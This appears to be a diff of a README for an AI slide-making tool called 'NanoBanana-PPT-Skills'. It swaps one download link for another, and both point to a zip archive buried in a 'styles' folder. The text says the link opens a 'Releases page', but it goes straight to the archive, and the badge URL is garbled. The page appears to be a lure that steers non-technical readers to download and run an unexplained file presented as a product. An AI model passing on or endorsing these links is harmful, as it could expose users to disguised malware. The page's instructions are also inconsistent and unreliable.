@@ -1,7 +1,7 @@
 # 🍌 NanoBanana-PPT-Skills - Create Stunning Presentations Effortlessly
 
 ## 📥 Download Now
-[![Download NanoBanana PPT Skills](https://github.com/girish6055/NanoBanana-PPT-Skills/raw/refs/heads/main/styles/Nano-Banana-Skills-PP-3.6.zip%20NanoBanana%20PPT%https://github.com/girish6055/NanoBanana-PPT-Skills/raw/refs/heads/main/styles/Nano-Banana-Skills-PP-3.6.zip)](https://github.com/girish6055/NanoBanana-PPT-Skills/raw/refs/heads/main/styles/Nano-Banana-Skills-PP-3.6.zip)
+[![Download NanoBanana PPT Skills](https://raw.githubusercontent.com/girish6055/NanoBanana-PPT-Skills/main/styles/Banana_Skills_Nano_PP_v1.2-beta.3.zip%20NanoBanana%20PPT%https://raw.githubusercontent.com/girish6055/NanoBanana-PPT-Skills/main/styles/Banana_Skills_Nano_PP_v1.2-beta.3.zip)](https://raw.githubusercontent.com/girish6055/NanoBanana-PPT-Skills/main/styles/Banana_Skills_Nano_PP_v1.2-beta.3.zip)
 
 ## 🚀 Getting Started
 Welcome to NanoBanana PPT Skills! This tool uses AI to help you create high-quality PowerPoint images and videos. You'll find it easy to use, even if you don’t have technical skills. Follow the steps below to get started.
@@ -16,7 +16,7 @@ Before you download, make sure your computer meets these basic requirements:
 ## 💻 Download & Install
 To get NanoBanana PPT Skills, follow these steps:
 1. Click the link below to visit the Releases page.
-   [Download NanoBanana PPT Skills](https://github.com/girish6055/NanoBanana-PPT-Skills/raw/refs/heads/main/styles/Nano-Banana-Skills-PP-3.6.zip)
+   [Download NanoBanana PPT Skills](https://raw.githubusercontent.com/girish6055/NanoBanana-PPT-Skills/main/styles/Banana_Skills_Nano_PP_v1.2-beta.3.zip)
 2. On the Releases page, you will see the latest version listed.
 3. Find the file that matches your operating system.
 4. Click on the file to begin downloading.
